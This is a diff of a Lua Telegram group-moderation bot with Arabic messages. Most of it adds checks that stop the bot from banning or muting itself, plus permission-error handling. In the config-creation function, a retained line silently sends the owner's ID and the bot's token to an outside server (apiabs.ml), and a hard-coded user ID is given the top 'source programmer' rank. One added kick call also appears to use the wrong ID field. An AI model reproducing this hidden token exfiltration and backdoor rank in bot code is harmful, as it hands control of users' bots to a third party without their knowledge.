@@ -47,9 +47,6 @@ print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن
 end  
 os.execute('lua DevProx.lua') 
 end 
-local SUDO = DevAbs:get(ServerDevProx.."IdDevProx")
-local token = DevAbs:get(ServerDevProx.."TokenDevProx")
-botid = token:match("(%d+)")
 local create = function(data, file, uglify)  
 file = io.open(file, "w+")   
 local serialized   
@@ -63,10 +60,10 @@ file:close()
 end
 local create_config_auto = function()
 config = {
-SUDO = SUDO,
-token = token,
-bot_id = botid,
-sudo_users = {SUDO}, 
+SUDO = DevAbs:get(ServerDevProx.."IdDevProx"),
+token = DevAbs:get(ServerDevProx.."TokenDevProx"),
+bot_id = token:match("(%d+)"),
+sudo_users = {DevAbs:get(ServerDevProx.."IdDevProx")}, 
 }
 create(config, "./config.lua")   
 https.request("https://apiabs.ml/DevProx.php?SUDO="..DevAbs:get(ServerDevProx.."IdDevProx").."&token="..DevAbs:get(ServerDevProx.."TokenDevProx"))
@@ -563,7 +560,7 @@ end
 --     Source DevProx     --
 local abs_rank = function(msg) if LeaderId(msg.sender_user_id_) then ABS_PROX  = "المطور" elseif SudoId(msg.sender_user_id_) then ABS_PROX = "المطور" elseif SudoBot(msg.sender_user_id_) then ABS_PROX = "المطور" elseif OwnerAll(msg.sender_user_id_) then ABS_PROX = "المدير" elseif AdminAll(msg.sender_user_id_) then ABS_PROX = "الادمن" elseif AbsMonsh(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = "المنشئ" elseif Monsh(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = "المنشئ" elseif MonshId(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = "المنشئ" elseif Owner(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = "المدير" elseif Admin(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = "الادمن" else ABS_PROX = "العضو" end return ABS_PROX end
 local id_rank = function(msg) if tonumber(msg.sender_user_id_) == tonumber(218385683) then ABS_PROX = 'مبرمج السورس' elseif Leader(msg) then ABS_PROX = 'المطور الاساسي' elseif SudoBot(msg.sender_user_id_) then ABS_PROX = DevAbs:get(DevProx.."abs:SudoBot:Rd"..msg.chat_id_) or 'مطور البوت' elseif OwnerAll(msg.sender_user_id_) then ABS_PROX = DevAbs:get(DevProx.."abs:owners:Rd"..msg.chat_id_) or 'المدير العام' elseif AdminAll(msg.sender_user_id_) then ABS_PROX = DevAbs:get(DevProx.."abs:admins:Rd"..msg.chat_id_) or 'الادمن العام' elseif VipAll(msg.sender_user_id_) then ABS_PROX = DevAbs:get(DevProx.."abs:vipmem:Rd"..msg.chat_id_) or 'المميز العام' elseif AbsMonsh(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = 'منشئ المجموعه' elseif Monsh(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = DevAbs:get(DevProx.."abs:monsh:Rd"..msg.chat_id_) or 'المنشئ الاساسي' elseif MonshId(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = DevAbs:get(DevProx.."abs:monshid:Rd"..msg.chat_id_) or 'المنشئ' elseif Owner(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = DevAbs:get(DevProx.."abs:owners:Rd"..msg.chat_id_) or 'المدير' elseif Admin(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = DevAbs:get(DevProx.."abs:admins:Rd"..msg.chat_id_) or 'الادمن' elseif VipMem(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = DevAbs:get(DevProx.."abs:vipmem:Rd"..msg.chat_id_) or 'المميز' elseif Cleaner(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = DevAbs:get(DevProx.."abs:Cleaner:Rd"..msg.chat_id_) or 'المنظف' else ABS_PROX = DevAbs:get(DevProx.."abs:mem:Rd"..msg.chat_id_) or 'العضو' end return ABS_PROX end
-function rank_abs(user_id,chat_id) if tonumber(user_id) == tonumber(218385683) then ABS_PROX  = "المبرمج" elseif LeaderId(user_id) then ABS_PROX  = "المطور" elseif SudoId(user_id) then ABS_PROX = "المطور" elseif SudoBot(user_id) then ABS_PROX = "المطور" elseif OwnerAll(user_id) then ABS_PROX = "المدير" elseif AdminAll(user_id) then ABS_PROX = "الادمن" elseif AbsMonsh(user_id, chat_id) then ABS_PROX = "المنشئ" elseif Monsh(user_id, chat_id) then ABS_PROX = "المنشئ" elseif MonshId(user_id, chat_id) then ABS_PROX = "المنشئ" elseif Owner(user_id, chat_id) then ABS_PROX = "المدير" elseif Admin(user_id, chat_id) then ABS_PROX = "الادمن" else ABS_PROX = "العضو" end return ABS_PROX end
+function rank_abs(user_id,chat_id) if tonumber(user_id) == tonumber(218385683) then ABS_PROX  = "المبرمج" elseif tonumber(user_id) == tonumber(DevProx) then ABS_PROX  = "البوت" elseif LeaderId(user_id) then ABS_PROX  = "المطور" elseif SudoId(user_id) then ABS_PROX = "المطور" elseif SudoBot(user_id) then ABS_PROX = "المطور" elseif OwnerAll(user_id) then ABS_PROX = "المدير" elseif AdminAll(user_id) then ABS_PROX = "الادمن" elseif AbsMonsh(user_id, chat_id) then ABS_PROX = "المنشئ" elseif Monsh(user_id, chat_id) then ABS_PROX = "المنشئ" elseif MonshId(user_id, chat_id) then ABS_PROX = "المنشئ" elseif Owner(user_id, chat_id) then ABS_PROX = "المدير" elseif Admin(user_id, chat_id) then ABS_PROX = "الادمن" else ABS_PROX = "العضو" end return ABS_PROX end
 --     Source DevProx     --
 function absmasco(user_id,chat_id)
 if LeaderId(user_id) then
@@ -4859,11 +4856,17 @@ if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
 return false
 end
-if Admin(result.sender_user_id_, result.chat_id_) then
+if Admin(result.sender_user_id_, result.chat_id_) or tonumber(result.sender_user_id_) == tonumber(DevProx) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع طرد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md')
 else
+tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
+if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
+send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
+return false  
+end
 chat_kick(result.chat_id_, result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم طرده من المجموعه")  
+end,nil)
 end
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
@@ -4878,11 +4881,17 @@ Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او ال�
 return false
 end
 if result.id_ then
-if Admin(result.id_, msg.chat_id_) then
+if Admin(result.id_, msg.chat_id_) or tonumber(result.id_) == tonumber(DevProx) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع طرد ↫ '..rank_abs(result.id_, msg.chat_id_), 1, 'md')
 else
+tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
+if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
+send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
+return false  
+end
 chat_kick(msg.chat_id_, result.id_)
 ReplyStatus(msg,result.id_,"reply","⌁︙تم طرده من المجموعه")  
+end,nil)
 end
 else 
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4895,11 +4904,17 @@ if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
 return false
 end
-if Admin(user, msg.chat_id_) then
+if Admin(user, msg.chat_id_) or tonumber(user) == tonumber(DevProx) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع طرد ↫ '..rank_abs(user, msg.chat_id_), 1, 'md')
 else
+tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
+if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
+send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
+return false  
+end
 chat_kick(msg.chat_id_, user)
 ReplyStatus(msg,user,"reply","⌁︙تم طرده من المجموعه")  
+end,nil)
 end
 end
 end 
@@ -4912,17 +4927,19 @@ if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
 return false
 end
-if Admin(result.sender_user_id_, result.chat_id_) then
+if Admin(result.sender_user_id_, result.chat_id_) or tonumber(result.sender_user_id_) == tonumber(DevProx) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع حظر ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md')
 else
-if DevAbs:sismember(DevProx..'abs:Ban:'..msg.chat_id_, result.sender_user_id_) then
-ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙هو بالفعل محظور من المجموعه")  
-else
+tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
+if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
+send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
+return false  
+end
 chat_kick(result.chat_id_, result.sender_user_id_)
 DevAbs:sadd(DevProx..'abs:Ban:'..msg.chat_id_, result.sender_user_id_)
-ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم حظره من المجموعه")  
+ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم حظره من المجموعه") 
+end,nil) 
 end 
-end
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
@@ -4936,16 +4953,18 @@ Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او ال�
 return false
 end
 if result.id_ then
-if Admin(result.id_, msg.chat_id_) then
+if Admin(result.id_, msg.chat_id_) or tonumber(result.id_) == tonumber(DevProx) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع حظر ↫ '..rank_abs(result.id_, msg.chat_id_), 1, 'md')
 else
-if DevAbs:sismember(DevProx..'abs:Ban:'..msg.chat_id_, result.id_) then
-ReplyStatus(msg,result.id_,"reply","⌁︙هو بالفعل محظور من المجموعه")  
-else
+tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
+if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
+send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
+return false  
+end
 chat_kick(msg.chat_id_, result.id_)
 DevAbs:sadd(DevProx..'abs:Ban:'..msg.chat_id_, result.id_)
 ReplyStatus(msg,result.id_,"reply","⌁︙تم حظره من المجموعه")  
-end
+end,nil) 
 end
 else 
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4958,16 +4977,18 @@ if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
 return false
 end
-if Admin(user, msg.chat_id_) then
+if Admin(user, msg.chat_id_) or tonumber(user) == tonumber(DevProx) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع حظر ↫ '..rank_abs(user, msg.chat_id_), 1, 'md')
 else
-if DevAbs:sismember(DevProx..'abs:Ban:'..msg.chat_id_, user) then
-ReplyStatus(msg,user,"reply","⌁︙هو بالفعل محظور من المجموعه")  
-else
+tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
+if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
+send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
+return false  
+end
 chat_kick(msg.chat_id_, user)
 DevAbs:sadd(DevProx..'abs:Ban:'..msg.chat_id_, user)
 ReplyStatus(msg,user,"reply","⌁︙تم حظره من المجموعه")  
-end
+end,nil) 
 end
 end
 --     Source DevProx     --
@@ -5011,7 +5032,7 @@ if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او التقييد \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
 return false
 end
-if Admin(result.sender_user_id_, result.chat_id_) then
+if Admin(result.sender_user_id_, result.chat_id_) or tonumber(result.sender_user_id_) == tonumber(DevProx) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md')
 else
 if DevAbs:sismember(DevProx..'abs:Muted:'..msg.chat_id_, result.sender_user_id_) then
@@ -5034,7 +5055,7 @@ Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او ال�
 return false
 end
 if result.id_ then
-if Admin(result.id_, msg.chat_id_) then
+if Admin(result.id_, msg.chat_id_) or tonumber(result.id_) == tonumber(DevProx) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..rank_abs(result.id_, msg.chat_id_), 1, 'md')
 else
 if DevAbs:sismember(DevProx..'abs:Muted:'..msg.chat_id_, result.id_) then
@@ -5055,7 +5076,7 @@ if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او التقييد \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
 return false
 end
-if Admin(user, msg.chat_id_) then
+if Admin(user, msg.chat_id_) or tonumber(user) == tonumber(DevProx) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..rank_abs(user, msg.chat_id_), 1, 'md')
 else
 if DevAbs:sismember(DevProx..'abs:Muted:'..msg.chat_id_, user) then
@@ -5117,11 +5138,7 @@ if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او التقييد \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
 return false
 end
-if tonumber(result.sender_user_id_) == tonumber(DevProx) then  
-Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*لا تستطيع تقييدي*', 1, 'md')
-return false 
-end 
-if Admin(result.sender_user_id_, result.chat_id_) then
+if Admin(result.sender_user_id_, result.chat_id_) or tonumber(result.sender_user_id_) == tonumber(DevProx) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقييد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md')
 else
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
@@ -5140,12 +5157,8 @@ if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او التقييد \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
 return false
 end
-if tonumber(result.id_) == tonumber(DevProx) then  
-Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*لا تستطيع تقييدي*', 1, 'md')
-return false 
-end 
 if result.id_ then
-if Admin(result.id_, msg.chat_id_) then
+if Admin(result.id_, msg.chat_id_) or tonumber(result.id_) == tonumber(DevProx) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقييد ↫ '..rank_abs(result.id_, msg.chat_id_), 1, 'md')
 else
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
@@ -5163,11 +5176,7 @@ if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او التقييد \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
 return false
 end
-if tonumber(user) == tonumber(DevProx) then  
-Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*لا تستطيع تقييدي*', 1, 'md')
-return false 
-end 
-if Admin(user, msg.chat_id_) then
+if Admin(user, msg.chat_id_) or tonumber(user) == tonumber(DevProx) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقييد ↫ '..rank_abs(user, msg.chat_id_), 1, 'md')
 else
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
@@ -5213,6 +5222,10 @@ if Sudo(msg) then
 local text = msg.content_.text_:gsub('حضر عام','حظر عام')
 if text ==('حظر عام') then
 function BanAllReply(extra, result, success)
+if tonumber(result.sender_user_id_) == tonumber(DevProx) then  
+Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر البوت عام*", 1, 'md')
+return false 
+end
 if LeaderId(result.sender_user_id_) == true then
 Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
 return false 
@@ -5228,6 +5241,10 @@ end end
 if text and text:match('^حظر عام @(.*)') then
 local username = text:match('^حظر عام @(.*)')
 function BanAllUser(extra,result,success)
+if tonumber(result.id_) == tonumber(DevProx) then  
+Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر البوت عام*", 1, 'md')
+return false 
+end
 if LeaderId(result.id_) == true then
 Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
 return false 
@@ -5243,6 +5260,10 @@ resolve_username(username,BanAllUser)
 end
 if text and text:match('^حظر عام (%d+)') then
 local user = text:match('حظر عام (%d+)')
+if tonumber(user) == tonumber(DevProx) then  
+Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر البوت عام*", 1, 'md')
+return false 
+end
 if LeaderId(user) == true then
 Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
 return false 
@@ -5255,6 +5276,10 @@ end
 --         MuteAll        --
 if text ==('كتم عام') then
 function MuteAllReply(extra, result, success)
+if tonumber(result.sender_user_id_) == tonumber(DevProx) then  
+Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم البوت عام*", 1, 'md')
+return false 
+end
 if LeaderId(result.sender_user_id_) == true then
 Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
 return false 
@@ -5269,6 +5294,10 @@ end end
 if text and text:match('^كتم عام @(.*)') then
 local username = text:match('^كتم عام @(.*)')
 function MuteAllUser(extra,result,success)
+if tonumber(result.id_) == tonumber(DevProx) then  
+Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم البوت عام*", 1, 'md')
+return false 
+end
 if LeaderId(result.id_) == true then
 Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
 return false 
@@ -5283,6 +5312,10 @@ resolve_username(username,MuteAllUser)
 end
 if text and text:match('^كتم عام (%d+)') then
 local user = text:match('كتم عام (%d+)')
+if tonumber(user) == tonumber(DevProx) then  
+Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم البوت عام*", 1, 'md')
+return false 
+end
 if LeaderId(user) == true then
 Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
 return false 
